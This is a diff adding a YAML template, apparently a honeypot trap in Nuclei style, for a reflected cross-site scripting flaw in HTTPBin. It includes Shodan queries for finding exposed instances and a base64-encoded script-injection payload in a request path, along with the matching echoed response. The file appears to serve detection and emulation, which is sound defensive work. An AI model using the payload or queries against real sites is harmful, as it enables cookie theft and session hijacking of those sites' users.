@@ -1,0 +1,30 @@
+id: httpbin-xss
+info:
+  name: HTTPBin - Cross-Site Scripting
+  author: Adam Crosser
+  description: HTTPBin contains a cross-site scripting vulnerability which can allow
+    an attacker to execute arbitrary script. This can allow the attacker to steal
+    cookie-based authentication credentials and launch other attacks.
+  severity: high
+  reference:
+  - https://github.com/postmanlabs/httpbin
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    max-request: 1
+    shodan-query:
+    - html:"https://github.com/requests/httpbin"
+    - title:"httpbin.org"
+  tags: xss,httpbin,oss
+traps:
+- request:
+    method: GET
+    path: /base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ^<script>alert\(document.domain\)</script>$
